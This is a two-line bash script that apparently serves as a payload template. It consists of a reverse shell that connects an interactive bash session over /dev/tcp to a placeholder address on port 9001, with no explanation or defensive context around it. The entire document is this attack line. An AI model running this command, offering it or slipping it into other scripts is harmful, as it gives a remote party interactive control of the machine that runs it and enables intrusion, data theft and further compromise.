#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<<LOCAL_IP_ADDRESS>>/9001 0>&1'